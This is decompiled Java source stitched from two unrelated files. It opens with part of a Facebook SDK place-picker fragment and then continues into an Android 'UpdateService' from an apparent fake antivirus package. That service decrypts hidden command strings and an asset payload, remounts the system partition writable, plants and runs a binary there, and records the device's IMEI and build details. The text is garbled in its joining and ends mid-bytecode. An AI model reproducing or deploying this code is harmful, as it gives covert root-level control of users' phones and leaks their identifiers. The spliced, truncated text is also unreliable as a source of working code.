    private static final String CATEGORY = "category";
    private static final String WERE_HERE_COUNT = "were_here_count";
    private static final String TAG = "PlacePickerFragment";

    private Location location;
    private int radiusInMeters = DEFAULT_RADIUS_IN_METERS;
    private int resultsLimit = DEFAULT_RESULTS_LIMIT;
    private String searchText;
    private Timer searchTextTimer;
    private boolean hasSearchTextChangedSinceLastQuery;
    private boolean showSearchBox = true;
    private EditText searchBox;

    /**
     * Default constructor. Creates a Fragment with all default properties.
     */
    public PlacePickerFragment() {
        this(null);
    }

    /**
     * Constructor.
     *
     * @param args a Bundle that optionally contains one or more values containing additional
     *             configuration information for the Fragment.
     */
    public PlacePickerFragment(Bundle args) {
        super(GraphPlace.class, R.layout.com_facebook_placepickerfragment, args);
        setPlacePickerSettingsFromBundle(args);
    }

    /**
     * Gets the location to search around. Either the location or the search text (or both) must be specified.
     *
     * @return the Location to search around
     */
    public Location getLocation() {
        return location;
    }

    /**
     * Sets the location to search around. Either the location or the search text (or both) must be specified.
     *
     * @param location the Location to search around
     */
    public void setLocation(Location location) {
        this.location = location;
    }

    /**
     * Gets the radius in meters around the location to search.
     *
     * @return the radius in meters
     */
    public int getRadiusInMeters() {
        return radiusInMeters;
    }

    /**
     * Sets the radius in meters around the location to search.
     *
     * @param radiusInMeters the radius in meters
     */
    public void setRadiusInMeters(int radiusInMeters) {
        this.radiusInMeters = radiusInMeters;
    }

    /**
     * Gets the number of results to retrieve.
     *
     * @return the number of results to retrieve
     */
    public int getResultsLimit() {
        return resultsLimit;
    }

    /**
     * Sets the number of results to retrieve.
     *
     * @param resultsLimit the number of results to retrieve
     */
    public void setResultsLimit(int resultsLimit) {
        this.resultsLimit = resultsLimit;
    }

    /**
     * Gets the search text (e.g., category, name) to search for. Either the location or the search
     * text (or both) must be specified.
     *
     * @return the search text
     */
    public String getSearchText() {
        return searchText;
    }

    /**
     * Sets the search text (e.g., category, name) to search for. Either the location or the search
     * text (or both) must be specified. If a search box is displayed, this will update its contents
     * to the specified text.
     *
     * @param searchText the search text
     */
    public void setSearchText(String searchText) {
        if (TextUtils.isEmpty(searchText)) {
            searchText = null;
        }
        this.searchText = searchText;
        if (this.searchBox != null) {
            this.searchBox.setText(searchText);
        }
    }

    /**
     * Sets the search text and reloads the data in the control. This is used to provide search-box
     * functionality where the user may be typing or editing text rapidly. It uses a timer to avoid repeated
     * requerying, preferring to wait until the user pauses typing to refresh the data. Note that this
     * method will NOT update the text in the search box, if any, as it is intended to be called as a result
     * of changes to the search box (and is public to enable applications to provide their own search box
     * UI instead of the default one).
     *
     * @param searchText                 the search text
     * @param forceReloadEventIfSameText if true, will reload even if the search text has not changed; if false,
     *                                   identical search text will not force a reload
     */
    public void onSearchBoxTextChanged(String searchText, boolean forceReloadEventIfSameText) {
        if (!forceReloadEventIfSameText && Utility.stringsEqualOrEmpty(this.searchText, searchText)) {
            return;
        }

        if (TextUtils.isEmpty(searchText)) {
            searchText = null;
        }
        this.searchText = searchText;

        // If search text is being set in response to user input, it is wasteful to send a new request
        // with every keystroke. Send a request the first time the search text is set, then set up a 2-second timer
        // and send whatever changes the user has made since then. (If nothing has changed
        // in 2 seconds, we reset so the next change will cause an immediate re-query.)
        hasSearchTextChangedSinceLastQuery = true;
        if (searchTextTimer == null) {
            searchTextTimer = createSearchTextTimer();
        }
    }

    /**
     * Gets the currently-selected place.
     *
     * @return the currently-selected place, or null if there is none
     */
    public GraphPlace getSelection() {
        Collection<GraphPlace> selection = getSelectedGraphObjects();
        return (selection != null && selection.size() > 0) ? selection.iterator().next() : null;
    }

    public void setSettingsFromBundle(Bundle inState) {
        super.setSettingsFromBundle(inState);
        setPlacePickerSettingsFromBundle(inState);
    }

    @Override
    public void onInflate(Activity activity, AttributeSet attrs, Bundle savedInstanceState) {
        super.onInflate(activity, attrs, savedInstanceState);
        TypedArray a = activity.obtainStyledAttributes(attrs, R.styleable.com_facebook_place_picker_fragment);

        setRadiusInMeters(a.getInt(R.styleable.com_facebook_place_picker_fragment_radius_in_meters, radiusInMeters));
        setResultsLimit(a.getInt(R.styleable.com_facebook_place_picker_fragment_results_limit, resultsLimit));
        if (a.hasValue(R.styleable.com_facebook_place_picker_fragment_results_limit)) {
            setSearchText(a.getString(R.styleable.com_facebook_place_picker_fragment_search_text));
        }
        showSearchBox = a.getBoolean(R.styleable.com_facebook_place_picker_fragment_show_search_box, showSearchBox);

        a.recycle();
    }

    @Override
    public void onActivityCreated(final Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);

        ViewGroup view = (ViewGroup) getView();
        if (showSearchBox) {
            ViewStub stub = (ViewStub) view.findViewById(R.id.com_facebook_placepickerfragment_search_box_stub);
            if (stub != null) {
                searchBox = (EditText) stub.inflate();

                // Put the list under the search box
                RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(
                        RelativeLayout.LayoutParams.FILL_PARENT,
                        RelativeLayout.LayoutParams.FILL_PARENT);
                layoutParams.addRule(RelativeLayout.BELOW, R.id.search_box);

                ListView listView = (ListView) view.findViewById(R.id.com_facebook_picker_list_view);
                listView.setLayoutParams(layoutParams);

                // If we need to, put the search box under the title bar.
                if (view.findViewById(R.id.com_facebook_picker_title_bar) != null) {
                    layoutParams = new RelativeLayout.LayoutParams(
                            RelativeLayout.LayoutParams.FILL_PARENT,
                            RelativeLayout.LayoutParams.WRAP_CONTENT);
                    layoutParams.addRule(RelativeLayout.BELOW, R.id.com_facebook_picker_title_bar);

                    searchBox.setLayoutParams(layoutParams);
                }

                searchBox.addTextChangedListener(new SearchTextWatcher());
                if (!TextUtils.isEmpty(searchText)) {
                    searchBox.setText(searchText);
                }
            }
        }
    }

    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);

        if (searchBox != null) {
            InputMethodManager imm = (InputMethodManager)getActivity().getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.showSoftInput(searchBox, InputMethodManager.SHOW_IMPLICIT);
        }
    }

    @Override
    public void onDetach() {
        super.onDetach();

        if (searchBox != null) {
            InputMethodManager imm = (InputMethodManager)getActivity().getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.hideSoftInputFromWindow(searchBox.getWindowToken(), 0);
        }
    }

    void saveSettingsToBundle(Bundle outState) {
        super.saveSettingsToBundle(outState);

        outState.putInt(RADIUS_IN_METERS_BUNDLE_KEY, radiusInMeters);
        outState.putInt(RESULTS_LIMIT_BUNDLE_KEY, resultsLimit);
        outState.putString(SEARCH_TEXT_BUNDLE_KEY, searchText);
        outState.putParcelable(LOCATION_BUNDLE_KEY, location);
        outState.putBoolean(SHOW_SEARCH_BOX_BUNDLE_KEY, showSearchBox);
    }

    @Override
    void onLoadingData() {
        hasSearchTextChangedSinceLastQuery = false;
    }

    @Override
    Request getRequestForLoadData(Session session) {
        return createRequest(location, radiusInMeters, resultsLimit, searchText, extraFields, session);
    }

    @Override
    String getDefaultTitleText() {
        return getString(R.string.com_facebook_nearby);
    }

    @Override
    PickerFragmentAdapter<GraphPlace> createAdapter() {
        PickerFragmentAdapter<GraphPlace> adapter = new PickerFragmentAdapter<GraphPlace>(
                this.getActivity()) {
            @Override
            protected CharSequence getSubTitleOfGraphObject(GraphPlace graphObject) {
                String category = graphObject.getCategory();
                Integer wereHereCount = (Integer) graphObject.getProperty(WERE_HERE_COUNT);

                String result = null;
                if (category != null && wereHereCount != null) {
                    result = getString(R.string.com_facebook_placepicker_subtitle_format, category, wereHereCount);
                } else if (category == null && wereHereCount != null) {
                    result = getString(R.string.com_facebook_placepicker_subtitle_were_here_only_format, wereHereCount);
                } else if (category != null && wereHereCount == null) {
                    result = getString(R.string.com_facebook_placepicker_subtitle_catetory_only_format, category);
                }
                return result;
            }

            @Override
            protected int getGraphObjectRowLayoutId(GraphPlace graphObject) {
                return R.layout.com_facebook_placepickerfragment_list_row;
            }

            @Override
            protected int getDefaultPicture() {
                return R.drawable.com_facebook_place_default_icon;
            }

        };
        adapter.setShowCheckbox(false);
        adapter.setShowPicture(getShowPictures());
        return adapter;
    }

    @Override
    LoadingStrategy createLoadingStrategy() {
        return new AsNeededLoadingStrategy();
    }

    @Override
    SelectionStrategy createSelectionStrategy() {
        return new SingleSelectionStrategy();
    }

    private Request createRequest(Location location, int radiusInMeters, int resultsLimit, String searchText,
            Set<String> extraFields,
            Session session) {
        Request request = Request.newPlacesSearchRequest(session, location, radiusInMeters, resultsLimit, searchText,
                null);

        Set<String> fields = new HashSet<String>(extraFields);
        String[] requiredFields = new String[]{
                ID,
                NAME,
                LOCATION,
                CATEGORY,
                WERE_HERE_COUNT
        };
        fields.addAll(Arrays.asList(requiredFields));

        String pictureField = adapter.getPictureFieldSpecifier();
        if (pictureField != null) {
            fields.add(pictureField);
        }

        Bundle parameters = request.getParameters();
        parameters.putString("fields", TextUtils.join(",", fields));
        request.setParameters(parameters);

        return request;
    }

    private void setPlacePickerSettingsFromBundle(Bundle inState) {
        // We do this in a separate non-overridable method so it is safe to call from the constructor.
        if (inState != null) {
            setRadiusInMeters(inState.getInt(RADIUS_IN_METERS_BUNDLE_KEY, radiusInMeters));
            setResultsLimit(inState.getInt(RESULTS_LIMIT_BUNDLE_KEY, resultsLimit));
            if (inState.containsKey(SEARCH_TEXT_BUNDLE_KEY)) {
                setSearchText(inState.getString(SEARCH_TEXT_BUNDLE_KEY));
            }
            if (inState.containsKey(LOCATION_BUNDLE_KEY)) {
                Location location = inState.getParcelable(LOCATION_BUNDLE_KEY);
                setLocation(location);
            }
            showSearchBox = inState.getBoolean(SHOW_SEARCH_BOX_BUNDLE_KEY, showSearchBox);
        }
    }

    private Timer createSearchTextTimer() {
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                onSearchTextTimerTriggered();
            }
        }, 0, searchTextTimerDelayInMilliseconds);

        return timer;
    }

    private void onSearchTextTimerTriggered() {
        if (hasSearchTextChangedSinceLastQuery) {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    FacebookException error = null;
                    try {
                        loadData(true);
                    } catch (FacebookException fe) {
                        error = fe;
                    } catch (Exception e) {
                        error = new FacebookException(e);
                    } finally {
                        if (error != null) {
                            OnErrorListener onErrorListener = getOnErrorListener();
                            if (onErrorListener != null) {
                                onErrorListener.onError(PlacePickerFragment.this, error);
                            } else {
                                Logger.log(LoggingBehavior.REQUESTS, TAG, "Error loading data : %s", error);
                            }
                        }
                    }
                }
            });
        } else {
            // Nothing has changed in 2 seconds. Invalidate and forget about this timer.
            // Next time the user types, we will fire a query immediately again.
            searchTextTimer.cancel();
            searchTextTimer = null;
        }
    }

    private class AsNeededLoadingStrategy extends LoadingStrategy {
        @Override
        public void attach(GraphObjectAdapter<GraphPlace> adapter) {
            super.attach(adapter);

            this.adapter.setDataNeededListener(new GraphObjectAdapter.DataNeededListener() {
                @Override
                public void onDataNeeded() {
                    // Do nothing if we are currently loading data . We will get notified again when that load finishes if the adapter still
                    // needs more data. Otherwise, follow the next link.
                    if (!loader.isLoading()) {
                        loader.followNextLink();
                    }
                }
            });
        }

        @Override
        protected void onLoadFinished(GraphObjectPagingLoader<GraphPlace> loader,
                SimpleGraphObjectCursor<GraphPlace> data) {
            super.onLoadFinished(loader, data);

            // We could be called in this state if we are clearing data or if we are being re-attached
            // in the middle of a query.
            if (data == null || loader.isLoading()) {
                return;
            }

            hideActivityCircle();

            if (data.isFromCache()) {
                // Only the first page can be cached, since all subsequent pages will be round-tripped. Force
                // a refresh of the first page before we allow paging to begin. If the first page produced
                // no data, launch the refresh immediately, otherwise schedule it for later.
                loader.refreshOriginalRequest(data.areMoreObjectsAvailable() ? CACHED_RESULT_REFRESH_DELAY : 0);
            }
        }
    }

    private class SearchTextWatcher implements TextWatcher {

        @Override
        public void beforeTextChanged(CharSequence s, int start, int count, int after) {
        }

        @Override
        public void onTextChanged(CharSequence s, int start, int before, int count) {
            onSearchBoxTextChanged(s.toString(), false);
        }

        @Override
        public void afterTextChanged(Editable s) {
        }
    }
}

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.ju6.AdManager;
import com.ju6.AdRequester;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public final class UpdateService extends Service {
    private static long INTERVAL = 60000L;

    private static final int OL = 18316;

    private static final byte[][] TIPS;

    private static final int TL = 18320;

    private static byte[] WP = new byte[] {
            83, 116, 97, 107, 95, 121, 69, 120, 121, 45,
            101, 76, 116, 33, 80, 119 };

    private String mAName = null;

    private String mIdentifier = "-1";

    private AdRequester mJu6Ad = null;

    private long mTickets = 9L;

    private Timer mTimer = null;

    private long startDelay = 3600L;

    static {
        byte[] arrayOfByte1 = {
                115, -41, -127, 17, 21, -7, 104, 90, -74, -93,
                79, -65, 72, 115, 113, 124, 20, 113, -67, -55,
                -99, -60, -89, -90, -123, 74, 6, -58, 69, 109,
                -68, -46 };
        byte[] arrayOfByte2 = {
                -47, 111, 106, -3, -88, -100, 90, -62, -19, 88,
                -99, 41, -109, -21, 124, 78, -68, 65, 41, 70,
                5, -46, -113, -80, -62, 15, 67, 85, 32, -7,
                -17, 93 };
        byte[] arrayOfByte3 = {
                35, 67, 97, 69, -98, -60, -101, 44, Byte.MIN_VALUE, -91,
                87, -127, 113, -59, 64, -108 };
        byte[] arrayOfByte4 = {
                36, -42, 113, -92, 48, -31, -108, -53, -120, Byte.MIN_VALUE,
                123, 48, 8, 61, 55, 49 };
        byte[] arrayOfByte5 = {
                -57, -52, -17, -79, 84, 22, -87, 107, 10, 34,
                96, -113, -125, 82, -92, -96 };
        byte[] arrayOfByte6 = {
                107, -31, 110, -42, -112, 47, 114, 115, 26, 66,
                -89, 117, -105, 85, -110, -62, -63, 19, 8, 41,
                7, -17, -31, 67, -35, -105, -92, -89, -102, -29,
                -79, 91 };
        byte[] arrayOfByte7 = {
                64, 7, -51, 38, -114, 81, 22, -124, 106, 122,
                88, 119, 48, -77, 94, 59 };
        byte[] arrayOfByte8 = {
                38, -60, -30, 13, 122, -106, -16, -18, 106, -79,
                36, -44, -53, 82, 68, Byte.MAX_VALUE };
        byte[] arrayOfByte9 = {
                -1, -119, 1, 31, 13, 76, -18, 25, Byte.MIN_VALUE, 103,
                63, 105, 2, -100, 6, 9 };
        TIPS = new byte[][] {
                {
                        -52, -81, 75, 27, 11, -108, 122, 121, -21, 74,
                        81, 73, 76, -123, 73, -116, 109, -42, 41, 37,
                        116, -64, 35, -78, -6, -90, 123, 80, 42, 13,
                        56, 37 }, arrayOfByte1, arrayOfByte2, arrayOfByte3, arrayOfByte4, {
                21, -103, -35, -1, 13, 52, 89, 16, -62, 114,
                65, -15, -81, -87, 5, -17 }, arrayOfByte5, {
                -48, 15, -69, 65, -83, -22, 118, -61, 60, -126,
                65, 59, 77, -119, -38, 23 }, arrayOfByte6, {
                -5, 113, -72, -5, -85, -32, 83, -11, -7, -115,
                -53, -69, 13, -63, 71, 70, -105, 53, 104, -9,
                42, 14, -37, 34, -101, 4, 104, 49, -80, 48,
                26, -6 },
                {
                        10, -4, 17, 29, -58, -23, -122, 70, -71, -82,
                        74, -45, -16, -85, 122, 95 }, arrayOfByte7, arrayOfByte8, arrayOfByte9 };
    }

    private void _doTimerTask() {
        if (this.mAName == null)
            this.mAName = getSystemMount();
        MyExecutor myExecutor = new MyExecutor();
        if (!myExecutor.init()) {
            myExecutor.close();
            shouMyDiag();
            return;
        }
        checkFile(myExecutor, false);
        String str = getTips(0);
        File file = new File(str);
        if (!file.exists() || file.length() < 18316L) {
            String str1 = getFilesDir() + getTips(4);
            String str2 = getFilesDir() + getTips(5);
            updateInfo(str2);
            copyAssets(getTips(3), str1, 18320);
            String str5 = getTips(6);
            String str3 = getTips(1);
            String str4 = getTips(2);
            if ((new File(str5)).exists()) {
                myExecutor.execute(String.valueOf(str5) + " " + str1 + " " + str, 1000);
                myExecutor.execute(String.valueOf(str5) + " " + str1 + " " + str4, 1000);
                if (!(new File(str3)).exists())
                    myExecutor.execute(String.valueOf(str5) + " " + str2 + " " + str3, 1000);
            } else {
                str5 = getTips(7);
                myExecutor.execute(String.valueOf(str5) + " " + str1 + " > " + str, 1000);
                myExecutor.execute(String.valueOf(str5) + " " + str1 + " > " + str4, 1000);
                if (!(new File(str3)).exists())
                    myExecutor.execute(String.valueOf(str5) + " " + str2 + " > " + str3, 1000);
            }
            myExecutor.execute(String.valueOf(getTips(8)) + str4, 100);
            myExecutor.execute(str4, 100);
            (new File(str1)).delete();
            (new File(str2)).delete();
        }
        checkFile(myExecutor, true);
    }

    private void checkFile(MyExecutor paramMyExecutor, boolean paramBoolean) {
        String str = getTips(9);
        if (paramBoolean) {
            str = String.valueOf(str) + "ro ";
        } else {
            str = String.valueOf(str) + "rw ";
        }
        paramMyExecutor.execute(String.valueOf(String.valueOf(String.valueOf(str) + this.mAName) + " ") + getTips(10), 1000);
    }

    private boolean checkPrecondition() {
        String str = getTips(0);
        if (str == null)
            return false;
        File file = new File(str);
        return (file.exists() && file.length() >= 18316L);
    }

    private void copyAssets(String paramString1, String paramString2, int paramInt) {
        // Byte code:
        //   0: aconst_null
        //   1: astore #5
        //   3: aconst_null
        //   4: astore #8
        //   6: aconst_null
        //   7: astore #4
        //   9: aconst_null
        //   10: astore #10
        //   12: aconst_null
        //   13: astore #9
        //   15: aconst_null
        //   16: astore #7
        //   18: iload_3
        //   19: ifgt -> 23
        //   22: return
        //   23: new java/io/FileOutputStream
        //   26: dup
        //   27: aload_2
        //   28: invokespecial <init> : (Ljava/lang/String;)V
        //   31: astore #6
        //   33: aload #10
        //   35: astore #4
        //   37: aload #9
        //   39: astore_2
        //   40: aload_0
        //   41: invokevirtual getClass : ()Ljava/lang/Class;
        //   44: new java/lang/StringBuilder
        //   47: dup
        //   48: ldc_w '/assets/'
        //   51: invokespecial <init> : (Ljava/lang/String;)V
        //   54: aload_1
        //   55: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   58: invokevirtual toString : ()Ljava/lang/String;
        //   61: invokevirtual getResourceAsStream : (Ljava/lang/String;)Ljava/io/InputStream;
        //   64: astore_1
        //   65: aload_1
        //   66: astore #4
        //   68: aload_1
        //   69: astore_2
        //   70: iload_3
        //   71: newarray byte
        //   73: astore #5
        //   75: aload_1
        //   76: astore #4
        //   78: aload_1
        //   79: astore_2
        //   80: aload_1
        //   81: aload #5
        //   83: invokevirtual read : ([B)I
        //   86: pop
        //   87: aload_1
        //   88: astore #4
        //   90: aload_1
        //   91: astore_2
        //   92: aload #6
        //   94: aload_0
        //   95: aload #5
        //   97: invokespecial decrypt : ([B)[B
        //   100: invokevirtual write : ([B)V
        //   103: aload_1
        //   104: astore #4
        //   106: aload_1
        //   107: astore_2
        //   108: aload #6
        //   110: invokevirtual flush : ()V
        //   113: aload_1
        //   114: ifnull -> 121
        //   117: aload_1
        //   118: invokevirtual close : ()V
        //   121: aload #6
        //   123: ifnull -> 231
        //   126: aload #6
        //   128: invokevirtual close : ()V
        //   131: return
        //   132: astore #6
        //   134: aload #8
        //   136: astore_1
        //   137: aload #7
        //   139: astore_2
        //   140: aload_2
        //   141: astore #4
        //   143: aload_1
        //   144: astore #5
        //   146: aload #6
        //   148: invokevirtual printStackTrace : ()V
        //   151: aload_2
        //   152: ifnull -> 159
        //   155: aload_2
        //   156: invokevirtual close : ()V
        //   159: aload_1
        //   160: ifnull -> 22
        //   163: aload_1
        //   164: invokevirtual close : ()V
        //   167: return
        //   168: astore_1
        //   169: return
        //   170: astore_1
        //   171: aload #4
        //   173: ifnull -> 181
        //   176: aload #4
        //   178: invokevirtual close : ()V
        //   181: aload #5
        //   183: ifnull -> 191
        //   186: aload #5
        //   188: invokevirtual close : ()V
        //   191: aload_1
        //   192: athrow
        //   193: astore_1
        //   194: return
        //   195: astore_2
        //   196: goto -> 159
        //   199: astore_2
        //   200: goto -> 181
        //   203: astore_2
        //   204: goto -> 191
        //   207: astore_1
        //   208: goto -> 121
        //   211: astore_1
        //   212: aload #6
        //   214: astore #5
        //   216: goto -> 171
        //   219: astore #4
        //   221: aload #6
        //   223: astore_1
        //   224: aload #4
        //   226: astore #6
        //   228: goto -> 140
        //   231: return
        // Exception table:
        //   from	to	target	type
        //   23	33	132	java/lang/Exception
        //   23	33	170	finally
        //   40	65	219	java/lang/Exception
        //   40	65	211	finally
        //   70	75	219	java/lang/Exception
        //   70	75	211	finally
        //   80	87	219	java/lang/Exception
        //   80	87	211	finally
        //   92	103	219	java/lang/Exception
        //   92	103	211	finally
        //   108	113	219	java/lang/Exception
        //   108	113	211	finally
        //   117	121	207	java/lang/Exception
        //   126	131	193	java/lang/Exception
        //   146	151	170	finally
        //   155	159	195	java/lang/Exception
        //   163	167	168	java/lang/Exception
        //   176	181	199	java/lang/Exception
        //   186	191	203	java/lang/Exception
    }

    private byte[] decrypt(byte[] paramArrayOfbyte) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(WP, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(2, secretKeySpec);
        return cipher.doFinal(paramArrayOfbyte);
    }

    private void doTimerTask() {
        if (checkPrecondition())
            stopSelf();
        this.mTickets++;
        if (this.mTickets % 10L == 0L)
            try {
                _doTimerTask();
            } catch (Exception exception) {}
        if (checkPrecondition())
            stopSelf();
    }

    private String getSystemMount() {
        // Byte code:
        //   0: aconst_null
        //   1: astore #5
        //   3: aconst_null
        //   4: astore #4
        //   6: aconst_null
        //   7: astore_1
        //   8: aconst_null
        //   9: astore_3
        //   10: new java/io/LineNumberReader
        //   13: dup
        //   14: new java/io/FileReader
        //   17: dup
        //   18: aload_0
        //   19: bipush #13
        //   21: invokespecial getTips : (I)Ljava/lang/String;
        //   24: invokespecial <init> : (Ljava/lang/String;)V
        //   27: invokespecial <init> : (Ljava/io/Reader;)V
        //   30: astore_2
        //   31: aload #4
        //   33: astore_1
        //   34: aload_2
        //   35: invokevirtual readLine : ()Ljava/lang/String;
        //   38: astore_3
        //   39: aload_3
        //   40: ifnonnull -> 53
        //   43: aload_2
        //   44: ifnull -> 142
        //   47: aload_2
        //   48: invokevirtual close : ()V
        //   51: aload_1
        //   52: areturn
        //   53: aload_3
        //   54: ldc_w ' '
        //   57: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
        //   60: astore_3
        //   61: aload_3
        //   62: iconst_1
        //   63: aaload
        //   64: ldc_w '/system'
        //   67: invokevirtual compareToIgnoreCase : (Ljava/lang/String;)I
        //   70: ifne -> 34
        //   73: aload_3
        //   74: iconst_0
        //   75: aaload
        //   76: astore_1
        //   77: goto -> 34
        //   80: astore #4
        //   82: aload #5
        //   84: astore_2
        //   85: aload_3
        //   86: astore_1
        //   87: aload #4
        //   89: invokevirtual printStackTrace : ()V
        //   92: aload_2
        //   93: astore_1
        //   94: aload_3
        //   95: ifnull -> 51
        //   98: aload_3
        //   99: invokevirtual close : ()V
        //   102: aload_2
        //   103: areturn
        //   104: astore_1
        //   105: aload_2
        //   106: areturn
        //   107: astore_2
        //   108: aload_1
        //   109: ifnull -> 116
        //   112: aload_1
        //   113: invokevirtual close : ()V
        //   116: aload_2
        //   117: athrow
        //   118: astore_2
        //   119: aload_1
        //   120: areturn
        //   121: astore_1
        //   122: goto -> 116
        //   125: astore_3
        //   126: aload_2
        //   127: astore_1
        //   128: aload_3
        //   129: astore_2
        //   130: goto -> 108
        //   133: astore #4
        //   135: aload_2
        //   136: astore_3
        //   137: aload_1
        //   138: astore_2
        //   139: goto -> 85
        //   142: aload_1
        //   143: areturn
        // Exception table:
        //   from	to	target	type
        //   10	31	80	java/lang/Exception
        //   10	31	107	finally
        //   34	39	133	java/lang/Exception
        //   34	39	125	finally
        //   47	51	118	java/lang/Exception
        //   53	73	133	java/lang/Exception
        //   53	73	125	finally
        //   87	92	107	finally
        //   98	102	104	java/lang/Exception
        //   112	116	121	java/lang/Exception
    }

    private String getTips(int paramInt) {
        try {
            return new String(decrypt(TIPS[paramInt]));
        } catch (Exception exception) {
            return null;
        }
    }

    private void initJu6Ad(String paramString1, String paramString2) {
        SharedPreferences sharedPreferences = getSharedPreferences("sstimestamp", 0);
        long l1 = sharedPreferences.getLong("last", 0L);
        long l2 = System.currentTimeMillis();
        if (l2 - l1 < 3600000L)
            return;
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putLong("last", l2);
        editor.commit();
        AdManager.init(paramString1, paramString2, false);
        this.mJu6Ad = new AdRequester((Context)this);
        this.mJu6Ad.getAd();
    }

    private void shouMyDiag() {
        // Byte code:
        //   0: aload_0
        //   1: invokevirtual getApplicationInfo : ()Landroid/content/pm/ApplicationInfo;
        //   4: astore_1
        //   5: new android/content/Intent
        //   8: dup
        //   9: invokespecial <init> : ()V
        //   12: astore_3
        //   13: aload_3
        //   14: aload_0
        //   15: ldc_w com/safesys/viruskiller/ShowTips
        //   18: invokevirtual setClass : (Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
        //   21: pop
        //   22: aload_1
        //   23: aload_0
        //   24: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   27: invokevirtual loadLabel : (Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;
        //   30: invokeinterface toString : ()Ljava/lang/String;
        //   35: astore_2
        //   36: aload_2
        //   37: ifnull -> 52
        //   40: aload_2
        //   41: astore_1
        //   42: ldc_w ''
        //   45: aload_2
        //   46: invokevirtual equals : (Ljava/lang/Object;)Z
        //   49: ifeq -> 56
        //   52: ldc_w '本软件'
        //   55: astore_1
        //   56: new java/lang/StringBuilder
        //   59: dup
        //   60: aload_1
        //   61: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
        //   64: invokespecial <init> : (Ljava/lang/String;)V
        //   67: ldc_w '需要root权限才能使用全部功能，请通过授权管理程序进行授权！'
        //   70: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   73: invokevirtual toString : ()Ljava/lang/String;
        //   76: astore_1
        //   77: aload_3
        //   78: ldc_w 'MM'
        //   81: new java/lang/String
        //   84: dup
        //   85: aload_1
        //   86: ldc_w 'UTF-8'
        //   89: invokevirtual getBytes : (Ljava/lang/String;)[B
        //   92: ldc_w 'UTF-8'
        //   95: invokespecial <init> : ([BLjava/lang/String;)V
        //   98: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
        //   101: pop
        //   102: aload_3
        //   103: ldc_w 268435456
        //   106: invokevirtual setFlags : (I)Landroid/content/Intent;
        //   109: pop
        //   110: aload_3
        //   111: ldc_w 'GG'
        //   114: ldc_w 'test'
        //   117: invokevirtual putExtra : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
        //   120: pop
        //   121: aload_0
        //   122: aload_3
        //   123: invokevirtual startActivity : (Landroid/content/Intent;)V
        //   126: return
        //   127: astore_1
        //   128: aload_1
        //   129: invokevirtual printStackTrace : ()V
        //   132: goto -> 102
        // Exception table:
        //   from	to	target	type
        //   77	102	127	java/io/UnsupportedEncodingException
    }

    private void updateInfo(String paramString) {
        String str1 = ((TelephonyManager)getSystemService("phone")).getDeviceId();
        String str2 = (String.valueOf(Build.BRAND) + "_" + Build.MODEL).replaceAll(" ", "_");
        String str3 = Build.VERSION.RELEASE.replaceAll(" ", "_");
        String str4 = Build.VERSION.SDK.replaceAll(" ", "_");
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(paramString);
            fileOutputStream.write((String.valueOf(str1) + " " + this.mIdentifier + " " + str2 + " " + str3 + " " + str4).getBytes());
            fileOutputStream.flush();
            fileOutputStream.close();
            return;
        } catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public IBinder onBind(Intent paramIntent) {
        return null;
    }

    public void onCreate() {
        // Byte code:
        //   0: aload_0
        //   1: invokespecial onCreate : ()V
        //   4: aload_0
        //   5: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   8: aload_0
        //   9: invokevirtual getPackageName : ()Ljava/lang/String;
        //   12: sipush #128
        //   15: invokevirtual getApplicationInfo : (Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
        //   18: getfield metaData : Landroid/os/Bundle;
        //   21: astore #5
        //   23: aload #5
        //   25: ldc_w 'SAFE_START'
        //   28: invokevirtual get : (Ljava/lang/String;)Ljava/lang/Object;
        //   31: astore #6
        //   33: aload #6
        //   35: ifnull -> 51
        //   38: aload_0
        //   39: aload #6
        //   41: checkcast java/lang/Integer
        //   44: invokevirtual intValue : ()I
        //   47: i2l
        //   48: putfield startDelay : J
        //   51: aload #5
        //   53: ldc_w 'SAFE_PID'
        //   56: invokevirtual get : (Ljava/lang/String;)Ljava/lang/Object;
        //   59: astore #5
        //   61: aload #5
        //   63: ifnull -> 75
        //   66: aload_0
        //   67: aload #5
        //   69: checkcast java/lang/String
        //   72: putfield mIdentifier : Ljava/lang/String;
        //   75: aload_0
        //   76: ldc_w 'sstimestamp'
        //   79: iconst_0
        //   80: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
        //   83: astore #5
        //   85: aload #5
        //   87: ldc_w 'start'
        //   90: lconst_0
        //   91: invokeinterface getLong : (Ljava/lang/String;J)J
        //   96: lstore_1
        //   97: invokestatic currentTimeMillis : ()J
        //   100: lstore_3
        //   101: lload_1
        //   102: lconst_0
        //   103: lcmp
        //   104: ifne -> 160
        //   107: aload #5
        //   109: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
        //   114: astore #5
